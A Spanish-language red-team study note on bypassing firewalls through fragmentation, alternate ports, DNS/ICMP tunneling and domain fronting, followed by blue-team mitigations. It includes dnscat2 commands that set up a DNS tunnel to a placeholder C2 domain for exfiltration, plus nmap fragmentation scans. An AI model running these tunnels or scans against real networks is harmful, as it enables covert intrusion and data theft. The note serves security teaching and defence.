---

tags: [ciberseguridad, evasion, firewall_bypass, tunneling, red_team, evasion_techniques, pivoting]
---
# Técnicas de Bypasseo de Firewall

El **bypasseo de firewall** engloba el conjunto de metodologías y vectores tácticos empleados por auditores de seguridad y Red Teams para eludir las restricciones de filtrado impuestas por cortafuegos tradicionales (L3/L4) y NGFW (L7). Estas técnicas explotan errores de configuración (*misconfigurations*), limitaciones en los motores de inspección de estado, protocolos no inspeccionados o excepciones en las políticas de salida (*Egress Filtering*).

---

## 🏛️ 1. Categorización de Vectores de Evasión

Los métodos de bypass se dividen principalmente en tres familias tácticas según la capa del modelo OSI sobre la que actúan:

### 1. Evasión L3 / L4 (Fragmentación y Puertos Alternativos)

- **¿Qué es?** Manipulación de las cabeceras básicas de red (IP/TCP/UDP) para engañar las reglas de filtrado simples.
    
- **¿Cómo funciona?**
    
    - **Fragmentación:** Se rompe el paquete de red en pedazos muy pequeños para que la firma del ataque quede dividida. El firewall no reconoce la amenaza al ver los trozos sueltos, pero la víctima los junta y se infecta.
        
    - **Puertos Alternativos:** El tráfico malicioso se envía por puertos comúnmente abiertos (ej. enviar tráfico de un virus por el puerto `443` o `80`), aprovechando que el firewall solo mira el puerto y no el contenido.
        

### 2. Encapsulamiento y Túneles (DNS / ICMP / SSH / HTTP)

- **¿Qué es?** Camuflar un protocolo prohibido metiéndolo "disfrazado" dentro de un protocolo permitido.
    
- **¿Cómo funciona?**
    
    - Si el firewall prohíbe el tráfico directo hacia el exterior pero permite **DNS** (para consultar webs) o **ICMP** (pings), el atacante mete las órdenes de control o los datos robados dentro de esas peticiones legítimas.
        
    - El firewall ve pasar una simple consulta DNS o un ping, cuando en realidad lleva datos cifrados de la amenaza en su interior.
        

### 3. Abuso de Capa 7 (Domain Fronting y Mimetismo App-ID)

- **¿Qué es?** Engañar a los firewalls modernos (NGFW) que inspeccionan aplicaciones completas y nombres de dominio.
    
- **¿Cómo funciona?**
    
    - **Domain Fronting:** El atacante usa grandes redes CDN (como Cloudflare o AWS). En el certificado visible (_SNI_) pone un dominio de alta reputación (ej. `google.com`), pero en la cabecera HTTP oculta redirige la conexión hacia su servidor malicioso. El firewall solo ve el dominio confiable y lo deja pasar.
        
    - **Mimetismo App-ID:** Hacer que el tráfico de control (_C2_) imite exactamente las características del tráfico web normal (HTTPS, Teams, Zoom) para pasar desapercibido entre el tráfico de los empleados.

---

## 🛠️ 2. Vectores Tácticos y Metodologías

| Técnica | Descripción Técnica | Impacto en la Inspección |
| --- | --- | --- |
| **Encapsulamiento en Protocolos Permitidos (Tunneling)** | Empaquetar tráfico arbitrario (C2, SSH, SOCKS) dentro de protocolos legítimos que suelen tener salida libre en el firewall (DNS/53 UDP, ICMP, HTTPS/443 TCP). | **Bypass de reglas L3/L4.** Si el firewall no aplica inspección profunda (DPI) o análisis de entropía/frecuencia sobre el protocolo portador, el tráfico atraviesa el perímetro. |
| **Fragmentación de Paquetes IP** | Dividir los encabezados TCP/UDP y el payload en múltiples fragmentos IP de pequeño tamaño (`IP Option Offset`). | **Bypass de firmas IPS/Stateful.** Reemplaza o solapa firmas conocidas para que el motor de inspección en el cortafuegos no pueda reconstruir el patrón del ataque antes de tomar la decisión de enrutamiento. |
| **Abuso de Puertos Legítimos (Port Matching)** | Configurar agentes C2 o shells remotas para escuchar en puertos estandarizados pero no inspeccionados (ej. TCP 443, TCP 80, UDP 123 NTP, UDP 53 DNS). | **Bypass de reglas estáticas.** Los firewalls no orientados a Capa 7 permiten la conexión simplemente revisando el puerto de destino en la cabecera del paquete. |
| **Domain Fronting & SNI Spoofing** | Utilizar la infraestructura de Redes de Distribución de Contenido (CDN) para enviar peticiones HTTPS donde el SNI TLS apunta a un dominio legítimo de alta reputación, mientras que la cabecera `Host` HTTP apunta al servidor malicioso. | **Bypass de motores App-ID y categorización URL.** El NGFW evalúa el certificado y el SNI como seguros, permitiendo el paso del tráfico cifrado. |

---

## 💻 3. Ejemplos Prácticos de Evasión

### 1. Túneles DNS (Exfiltración y C2)

Si el cortafuegos restringe la salida TCP/UDP pero permite resoluciones de nombres hacia un servidor DNS recursivo interno:

```bash
# Servidor del Atacante (Autoritativo para el dominio c2.dominio.com)
dnscat2-server --dns domain=c2.dominio.com

# Cliente en la Máquina Comprometida (Evasión de Egress Filtering)
dnscat2 --dns domain=c2.dominio.com

```

* **Mecanismo:** Las peticiones de nombres codificadas en Base32/Hexadecimal (`<data>.c2.dominio.com`) son reenviadas por el servidor DNS interno hacia Internet, esquivando el firewall directo.

### 2. Evasión mediante Fragmentación con Nmap

```bash
# Escaneo de puertos dividiendo los paquetes en fragmentos de 8 bytes
nmap -sS -Pn -f -mtu 16 -p 22,80,443 192.168.1.1

# Generación de paquetes con datos arbitrarios o MTU modificado
nmap --data-length 25 --badsum 192.168.1.1

```

---

## 🛡️ 4. Perspectiva de Blue Team: Contramedidas y Mitigación

Para neutralizar las técnicas de evasión de cortafuegos, el equipo defensivo debe implementar un modelo de **inspección profunda multicapa**:

1. **Bloqueo Estricto de DNS Externo:** La red interna solo debe comunicarse con los servidores DNS corporativos locales. Toda petición saliente directa a resolvers públicos (8.8.8.8, 1.1.1.1) en puerto UDP/53 debe ser bloqueada.
2. **Inspección SSL/TLS (MitM Decryption):** Habilitar la inspección de tráfico cifrado en los NGFW para analizar las cabeceras HTTP internas (`Host`) y validar la concordancia con el SNI en conexiones HTTPS.
3. **Análisis de Entropía y Comportamiento:** Desplegar soluciones NDR (*Network Detection and Response*) para identificar patrones de tunelización DNS/ICMP mediante la detección de volumen inusual de peticiones TXT/A y cálculo de entropía en subdominios.

*MOC de Referencia:* [[MOC_Seguridad_Perimetral_y_Firewalls]]